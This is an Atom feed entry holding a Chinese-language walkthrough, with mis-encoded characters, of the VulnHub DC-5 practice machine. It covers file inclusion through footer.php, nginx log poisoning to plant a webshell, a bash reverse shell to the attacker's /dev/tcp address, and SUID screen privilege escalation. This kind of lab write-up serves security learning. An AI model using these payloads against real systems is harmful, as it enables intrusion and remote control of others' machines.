    <content type="html"><![CDATA[<h1 id="æ¼æ´ç¯å¢ƒ"><a href="#æ¼æ´ç¯å¢ƒ" class="headerlink" title="æ¼æ´ç¯å¢ƒ"></a>æ¼æ´ç¯å¢ƒ</h1><p>vulnhub <a href="https://www.vulnhub.com/entry/dc-5,314/">https://www.vulnhub.com/entry/dc-5,314/</a><br>é¶æœº:172.16.17.146<br>æ”»å‡»æœºkali:172.16.17.140</p><h1 id="æè¿°"><a href="#æè¿°" class="headerlink" title="æè¿°"></a>æè¿°</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206141926926.png"></p><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><p>nmapæ‰«æé¶æœº<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206141959729.png"></p><p>å¼€äº†111ç«¯å£rpcbind,ç™¾åº¦æ˜¯æ‹’ç»æœåŠ¡æ¼æ´,å¿½ç•¥</p><p>æ‰“å¼€ç½‘ç«™é¦–é¡µ,æ‰«ä¸€ä¸‹ç›®å½•<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142002735.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142002568.png"></p><p>å‘ç°ä¸€ä¸ªç•™è¨€æ¿,æäº¤çœ‹çœ‹<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142008726.png"><br>å¤šæ¬¡æäº¤åå‘ç°,é¡µè„šåœ¨å˜åŒ–,ç»“åˆæ‰«ç›®å½•æ—¶å€™å‘ç°ä¸€ä¸ªfooter.php<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142009106.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142010169.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>åº”è¯¥æ˜¯åŒ…å«äº†è¿™ä¸ªfooter.phpæ–‡ä»¶,å°è¯•æ–‡ä»¶åŒ…å«æ¼æ´,çŒœä¸€ä¸‹å‚æ•°å<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142013650.png"></p><p>å°è¯•ä¼ªåè®®getshell,ä½†æ˜¯åº”è¯¥æ²¡æœ‰å¼€å¯allow_url_include,é»˜è®¤ä¸ºå…³é—­</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1?file=php://input PostData:&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><h2 id="å°è¯•è¯»å–åˆ«çš„ä¿¡æ¯"><a href="#å°è¯•è¯»å–åˆ«çš„ä¿¡æ¯" class="headerlink" title="å°è¯•è¯»å–åˆ«çš„ä¿¡æ¯"></a>å°è¯•è¯»å–åˆ«çš„ä¿¡æ¯</h2><p>æƒé™å¾ˆä½,åªèƒ½è¯»å–ä¸€ä¸‹nginxçš„æ—¥å¿—,å› ä¸ºæ‰«è¿‡ç›®å½•æ‰€ä»¥ä¿¡æ¯å¾ˆå¤š,ç¿»åˆ°æœ€åå¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¯»å–&#x2F;etc&#x2F;passwdçš„è¯·æ±‚<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142025366.png"></p><h2 id="å†™webshell"><a href="#å†™webshell" class="headerlink" title="å†™webshell"></a>å†™webshell</h2><p>æ€»ç»“ä¸€ä¸‹,ç°åœ¨æˆ‘ä»¬æœ‰æ–‡ä»¶åŒ…å«,èƒ½æŸ¥çœ‹nginxæ—¥å¿—<br>é‚£ä¹ˆæˆ‘æ˜¯å¦å¯ä»¥æ„é€ ä¸€å¥è¯è¯·æ±‚,è®©ä»–å†™å…¥æ—¥å¿—,å†åˆ©ç”¨æ–‡ä»¶åŒ…å«å»æ‰§è¡Œ<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142210938.png"></p><p>è¿™é‡Œæœ‰ä¸€ä¸ªå‘,è¯·æ±‚å‘é€ä¹‹å,å†å»æŸ¥çœ‹æ—¥å¿—,å´æ²¡æœ‰,å…¶å®å·²ç»å†™è¿›å»äº†<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142212468.png"></p><h2 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h2><p>åå¼¹ä¸€ä¸ªshellåˆ°kali</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;exec bash -i &amp;&gt;/dev/tcp/172.16.17.140/4444 &lt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142214174.png"></p><p>è¿™é‡Œåå¼¹å›æ¥çš„å°±æ˜¯ä¸€ä¸ªäº¤äº’å¼shell</p><h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><h2 id="suidææƒ"><a href="#suidææƒ" class="headerlink" title="suidææƒ"></a>suidææƒ</h2><p>ç¿»äº†ç¿»ç›®å½•,æ²¡ä»€ä¹ˆä¸œè¥¿,çœ‹çœ‹ä»¥rootæƒé™è¿è¡Œçš„å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142217377.png"></p><p>æœ‰ä¸€ä¸ªscreen<br>Screenæ˜¯ä¸€æ¬¾ç”±GNUè®¡åˆ’å¼€å‘çš„ç”¨äºå‘½ä»¤è¡Œç»ˆç«¯åˆ‡æ¢çš„è‡ªç”±è½¯ä»¶ã€‚ç”¨æˆ·å¯ä»¥é€šè¿‡è¯¥è½¯ä»¶åŒæ—¶è¿æ¥å¤šä¸ªæœ¬åœ°æˆ–è¿œç¨‹çš„å‘½ä»¤è¡Œä¼šè¯ï¼Œå¹¶åœ¨å…¶é—´è‡ªç”±åˆ‡æ¢ã€‚GNU Screenå¯ä»¥çœ‹ä½œæ˜¯çª—å£ç®¡ç†å™¨çš„å‘½ä»¤è¡Œç•Œé¢ç‰ˆæœ¬ã€‚å®ƒæä¾›äº†ç»Ÿä¸€çš„ç®¡ç†å¤šä¸ªä¼šè¯çš„ç•Œé¢å’Œç›¸åº”çš„åŠŸèƒ½ã€‚</p><p>kaliæœç´¢ä¸€ä¸‹åˆ©ç”¨<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142235068.png"></p><p>å°†expå¤åˆ¶å‡ºæ¥ç”¨èšå‰‘ç›´æ¥å†™åˆ°tmpç›®å½•ä¸‹<br>åœ¨rootç›®å½•ä¸‹æ‹¿åˆ°flag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142236665.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;æ¼æ´ç¯å¢ƒ&quot;&gt;&lt;a href=&quot;#æ¼æ´ç¯å¢ƒ&quot; class=&quot;headerlink&quot; title=&quot;æ¼æ´ç¯å¢ƒ&quot;&gt;&lt;/a&gt;æ¼æ´ç¯å¢ƒ&lt;/h1&gt;&lt;p&gt;vulnhub &lt;a href=&quot;https://www.vulnhub.com/entry/dc-5,314/&quot;&gt;https://www.vulnhub.com/entry/dc-5,314/&lt;/a&gt;&lt;br&gt;é¶æœº:172.16.17.146&lt;br&gt;æ”»å‡»æœºkali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;æè¿°&quot;&gt;&lt;a href=&quot;#æè¿°&quot; class=&quot;headerlink&quot; title=&quot;æè¿°&quot;&gt;&lt;/a&gt;æè¿°&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206141926926.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;a href=&quot;#ä¿¡æ¯æ”¶é›†&quot; class=&quot;headerlink&quot; title=&quot;ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;/a&gt;ä¿¡æ¯æ”¶é›†&lt;/h1&gt;</summary>
    
    
    
    <category term="æ‰“é¶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="æ–‡ä»¶åŒ…å«" scheme="https://syst1m.top/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
  </entry>
  
</feed>
